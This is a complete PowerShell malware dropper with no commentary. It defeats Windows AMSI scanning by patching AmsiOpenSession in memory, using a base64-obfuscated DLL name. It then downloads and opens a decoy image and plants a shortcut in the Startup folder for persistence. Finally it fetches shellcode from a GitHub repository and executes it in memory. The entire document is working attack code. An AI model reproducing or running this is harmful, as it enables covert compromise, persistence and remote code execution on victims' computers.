
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class NukeAMSI
{
    public const int PROCESS_VM_OPERATION = 0x0008;
    public const int PROCESS_VM_READ = 0x0010;
    public const int PROCESS_VM_WRITE = 0x0020;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;

    // NtOpenProcess: Opens a handle to a process.
    [DllImport("ntdll.dll")]
    public static extern int NtOpenProcess(out IntPtr ProcessHandle, uint DesiredAccess, [In] ref OBJECT_ATTRIBUTES ObjectAttributes, [In] ref CLIENT_ID ClientId);

    // NtWriteVirtualMemory: Writes to the memory of a process.
    [DllImport("ntdll.dll")]
    public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);

    // NtClose: Closes an open handle.
    [DllImport("ntdll.dll")]
    public static extern int NtClose(IntPtr Handle);

    // LoadLibrary: Loads the specified module into the address space of the calling process.
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    // GetProcAddress: Retrieves the address of an exported function or variable from the specified dynamic-link library (DLL).
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    // VirtualProtectEx: Changes the protection on a region of memory within the virtual address space of a specified process.
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public int Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }
}
"@

function ModAMSI {
    param (
        [int]$processId
    )

    $patch = [byte]0xEB  # The patch byte to modify AMSI behavior

    $objectAttributes = New-Object NukeAMSI+OBJECT_ATTRIBUTES
    $clientId = New-Object NukeAMSI+CLIENT_ID
    $clientId.UniqueProcess = [IntPtr]$processId
    $clientId.UniqueThread = [IntPtr]::Zero
    $objectAttributes.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($objectAttributes)

    $hHandle = [IntPtr]::Zero
    $status = [NukeAMSI]::NtOpenProcess([ref]$hHandle, [NukeAMSI]::PROCESS_VM_OPERATION -bor [NukeAMSI]::PROCESS_VM_READ -bor [NukeAMSI]::PROCESS_VM_WRITE, [ref]$objectAttributes, [ref]$clientId)
    $amsiDll = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YW1zaS5k")) + "ll"
    $amsiHandle = [NukeAMSI]::LoadLibrary($amsiDll)
    $amsiOpenSession = [NukeAMSI]::GetProcAddress($amsiHandle, "AmsiOpenSession")
    $patchAddr = [IntPtr]($amsiOpenSession.ToInt64() + 3)
    $oldProtect = [UInt32]0
    $size = [UIntPtr]::new(1)
    $protectStatus = [NukeAMSI]::VirtualProtectEx($hHandle, $patchAddr, $size, [NukeAMSI]::PAGE_EXECUTE_READWRITE, [ref]$oldProtect)
    $bytesWritten = [System.UInt32]0
    $status = [NukeAMSI]::NtWriteVirtualMemory($hHandle, $patchAddr, [byte[]]@($patch), 1, [ref]$bytesWritten)
    $restoreStatus = [NukeAMSI]::VirtualProtectEx($hHandle, $patchAddr, $size, $oldProtect, [ref]$oldProtect)
    [NukeAMSI]::NtClose($hHandle)



    

}

function ModAllPShells {
    ModAMSI -processId $PID
}


ModAllPShells

Start-Sleep 5


#/// EXECUTE THE SECOND PART OF THE SCRIPT (LOCAL OPERATIONS) \\#
# Download the image (decoy)
$imageUrl = "https://img.freepik.com/free-photo/abstract-surface-textures-white-concrete-stone-wall_74190-8189.jpg"
$imagePath = "$env:TEMP\blue-bird.jpg"
Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath

$luri = "https://github.com/bigaersdifmo/test09123/raw/refs/heads/master/secret-image.lnk"
$sf = [System.Environment]::GetFolderPath('Startup')
$lnp = "$sf\secret-image.lnk"
Invoke-WebRequest -Uri $luri -OutFile $lnp

# Open the downloaded image (decoy)
if (Test-Path $imagePath) {
    Start-Process $imagePath
} else {
    Write-Host "Image download failed."
}

# Download and load shellcode directly into memory
$shellcodeUrl = "https://github.com/bigaersdifmo/test09123/raw/refs/heads/master/loader.bin"
$shellcode = (Invoke-WebRequest -Uri $shellcodeUrl -UseBasicParsing).Content

# Allocate memory for the shellcode
$size = $shellcode.Length
$address = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $address, $size)

# Define the VirtualProtect function using P/Invoke
$virtualProtect = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type -TypeDefinition $virtualProtect

# Mark the memory as executable
$oldProtect = 0
$protectResult = [Win32]::VirtualProtect($address, $size, 0x40, [ref]$oldProtect)  # 0x40 = PAGE_EXECUTE_READWRITE
if (-not $protectResult) {
    throw "Failed to mark memory as executable."
}

# Create a delegate to the shellcode
$shellcodeDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($address, [type]::GetType("System.Action"))

# Execute the shellcode
$shellcodeDelegate.Invoke()

# Free the allocated memory (optional, as the process may terminate)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($address)
